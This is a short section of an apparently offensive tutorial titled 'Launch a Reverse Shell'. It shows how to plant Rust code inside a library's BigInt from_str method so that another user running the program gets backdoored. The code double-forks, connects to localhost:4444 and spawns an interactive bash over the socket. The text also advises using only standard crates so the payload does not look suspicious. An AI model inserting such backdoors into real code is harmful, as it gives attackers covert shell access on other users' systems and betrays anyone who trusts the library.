# Launch a Reverse Shell

Instead of writing a meaningless message from the source code, we'll write a payload that will spawn a reverse shell.

From a user other than the one targeting, enter the previously selected method's source code and place the following code:

```
use std::process::{Command, Stdio};

extern "C" {
    fn fork() -> i32;
    fn close(fd: i32) -> i32;
    fn setsid() -> i32;
}


...

#[inline]
fn from_str(s: &str) -> Result<BigInt, ParseBigIntError> {
    static mut IN: bool = false;
    unsafe {
        // Check we are not spawning multiple reverse shells
        if !IN {
            IN = true;
            let pid = fork();
            // let the child spawn the reverse shell
            if pid == 0 {
                // perform fork-decouple-fork (a.k.a double fork)
                // this is important so that you avoid receiving a SIGTTIN that would send to the background the target user's program
                let pid_child = fork();
                if pid_child > 0 { std::process::exit(0) }
                setsid();
                let pid_gchild = fork();
                if pid_gchild > 0 {std::process::exit(0)}
                let sock = TcpStream::connect("localhost:4444").unwrap();
                let fd = sock.as_raw_fd();
                Command::new("/bin/bash")
                    .arg("-i")
                    .stdin(unsafe { Stdio::from_raw_fd(fd) })
                    .stdout(unsafe { Stdio::from_raw_fd(fd) })
                    .stderr(unsafe { Stdio::from_raw_fd(fd) })
                    .spawn()
                    .unwrap()
                    .wait()
                    .unwrap();
                std::process::exit(0);
            }
        }
    }
    BigInt::from_str_radix(s, 10)
}

```

It is important to note that we are not using any extern crate that might look suspicious from the outside, stick to the standard crate and external C functions.